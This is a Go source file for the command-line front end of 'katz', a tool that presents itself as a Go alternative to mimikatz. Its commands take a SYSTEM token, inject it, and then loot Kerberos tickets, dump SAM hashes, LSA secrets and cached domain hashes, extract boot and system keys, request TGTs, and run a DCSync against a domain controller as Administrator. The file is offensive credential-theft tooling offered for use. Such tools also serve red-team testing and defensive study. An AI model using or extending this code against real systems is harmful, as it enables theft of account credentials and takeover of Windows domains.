package cli

import (
	// "encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	katz_modules "katz/katz/modules"

	katz_utils "katz/katz/utils"

	"github.com/spf13/cobra"

	test "katz/katz/modules/rpc"
)

var rootCmd = &cobra.Command{
	Use: "katz.exe",
	Short: "Go go gadget katz!",
	Long: `A go alternative to mimikatz.exe`,
}
const banner = `
  /\_/\  (    ██╗  ██╗ █████╗ ████████╗███████╗
 ( ^.^ ) _)   ██║ ██╔╝██╔══██╗╚══██╔══╝╚══███╔╝
   \"/"  (     █████╔╝ ███████║   ██║     ███╔╝ 
 ( | | )      ██╔═██╗ ██╔══██║   ██║    ███╔╝  
(__d b__)      ██║  ██╗██║  ██║   ██║   ███████╗
               ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝`


var testCmd = &cobra.Command{
	Use: "test",
	Short: "run test code",
	Run: func (cmd *cobra.Command, args []string)  {
		dc, _ := os.Hostname()
		dc = dc + ".test.local"
		password, _ := cmd.Flags().GetString("passwd")
		test.DCSync("Administrator", password, dc, "test.local", 636)

	},
}

var kerberos = &cobra.Command{
	Use: "kerb",
	Short: "kerberos tickets",
}
var lootTickets = &cobra.Command{
	Use: "tickets",
	Short: "loot all kerberos tickets",
	Run: func(cmd *cobra.Command, args []string) {
		systoken, _  := katz_utils.GetSystem()
		katz_utils.InjectToken(systoken)
		tickets := katz_modules.GetKerberosTickets()
		for _, ticket := range tickets {
			uname := ticket["username"].(string)
			domain := ticket["domain"].(string)
			ticket := ticket["krbCred"].(string)
			fmt.Println(uname + "@" + domain + "::" + ticket + "\n\n")
			// fmt.Println(ticket["krbCred"])
		}
	},
}
var tgt = &cobra.Command{
	Use: "tgt",
	Short: "request a TGT, (it is recommended to purge klist before requesting a new ticket for the current user)",
	Run: func(cmd *cobra.Command, args []string) {
		username, _ := cmd.Flags().GetString("user")
		passwd, _ := cmd.Flags().GetString("pass")
		domain, _ := cmd.Flags().GetString("domain")
		serviceName, _ := cmd.Flags().GetString("serviceName")
		if serviceName == "" {
			serviceName =  "krbtgt/"+ strings.ToUpper(domain)
		}
		response, err := katz_modules.TGT(username, domain, passwd, serviceName)
		if err != nil {
			response = err.Error()
		}
		fmt.Println(response)
	},
}


var cached = &cobra.Command{
	Use: "cached",
	Short: "access something in cache",
}

var cached_hashes = &cobra.Command{
	Use: "hashes",
	Short: "get cached hashes",
	Run: func(cmd *cobra.Command, args []string) {
		nonvistastyle, _ := cmd.Flags().GetBool("nonvistastyle")
		nonvistastyle = !nonvistastyle
		systoken, _  := katz_utils.GetSystem()
		bootKey, _ := katz_modules.GetBootKey(systoken)
		hashes, err := katz_modules.CachedHashes(systoken, bootKey, nonvistastyle)
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, hash := range hashes {
			fmt.Println(hash.Cache)
		}
		
	},
}

var lsa = &cobra.Command{
	Use: "lsa",
	Short: "do something with the LSA database",
	Run: func (cmd *cobra.Command, args []string) {
		dump, _ := cmd.Flags().GetBool("dump")
		history, _ := cmd.Flags().GetBool("history")
		output := ""
		nonvistastyle, _ := cmd.Flags().GetBool("nonvistastyle")
		nonvistastyle = !nonvistastyle
		if dump != false {
			token, err := katz_utils.GetSystem()
			if err != nil {
				fmt.Println(err)
				return
			}
			
			bootKey, err := katz_modules.GetBootKey(token)
			secrets, err := katz_modules.DumpLSASecrets(token, bootKey, nonvistastyle, history)
			for index := range secrets {
				output += secrets[index].PrintSecret() + "\n"
			}
		}else {
			cmd.Help()
			return
		}
		fmt.Println(output)
	},
}

var sam = &cobra.Command{
	Use: "sam",
	Short: "do something with the SAM database",
	Run: func(cmd *cobra.Command, args []string) {
		var output string
		dump, _ := cmd.Flags().GetBool("dump")
		getbootKey, _ := cmd.Flags().GetBool("bootKey")
		getsysKey, _ := cmd.Flags().GetBool("sysKey")
		
		if dump == true {
			token, err := katz_utils.GetSystem()
			if err != nil {
				fmt.Println(err)
				return
			}
			data, err := katz_modules.DumpSAM(token)
			if err != nil {
				fmt.Println(err)
				return
			}
			var formatted []string

			for _, d := range data {
				rid := d.Rid
					Name := d.Name
					nt := d.Nthash
					d_str := fmt.Sprintf("%s:%d:%s", Name, rid, nt)
					d_str = strings.Replace(d_str, " ", "", -1)
					if d_str != ":0:"{
						formatted = append(formatted, d_str)
					}
			}
			output = strings.Join(formatted[:], "\n")
		}else if getbootKey == true {
			token, err := katz_utils.GetSystem()
			if err != nil {
				fmt.Println(err)
				return
			}
			data, err := katz_modules.GetBootKey(token)
			if err != nil {
				fmt.Println(err)
				return
			}
			output += "0x" + hex.EncodeToString(data)
		}else if getsysKey == true {
			token, err := katz_utils.GetSystem()
			if err != nil {
				fmt.Println(err)
				return
			}
			data, err := katz_modules.GetSysKey(token)
			if err != nil {
				fmt.Println(err)
				return
			}
			output += data
		}else {
			cmd.Help()
			return
		}
	fmt.Println(output)

	},
}

func PrintBanner(){
	fmt.Println(banner)
}
func Init() {
	fmt.Println(banner)

	testCmd.Flags().String("passwd", "password", "")

	lsa.Flags().Bool("dump", false, "dump lsa database")
	lsa.Flags().Bool("history", false, "get lsa history")
	lsa.Flags().Bool("nonvistastyle", false, "non vista style?")
	cached_hashes.Flags().Bool("nonvistastyle", false, "non vista style?")
	sam.Flags().Bool("dump", false, "dump sam database")
	sam.Flags().Bool("bootKey", false, "get boot key")
	sam.Flags().Bool("sysKey", false, "get system key")
	tgt.Flags().String("user", "Administrator", "username flag (default is 'Administrator')")
	tgt.Flags().String("pass", "password", "password flag, default is 'password'")
	tgt.Flags().String("domain", "test.local", "domain flag, default is 'test.local'")
	tgt.Flags().String("serviceName", "", "service name flag, default is empty and will go to 'krbtgt/<domain>'")

	rootCmd.AddCommand(sam)
	rootCmd.AddCommand(testCmd)
	rootCmd.AddCommand(lsa)

	cached.AddCommand(lootTickets)
	cached.AddCommand(cached_hashes)

	kerberos.AddCommand(tgt)

	rootCmd.AddCommand(kerberos)
	rootCmd.AddCommand(cached)

	rootCmd.Execute()
}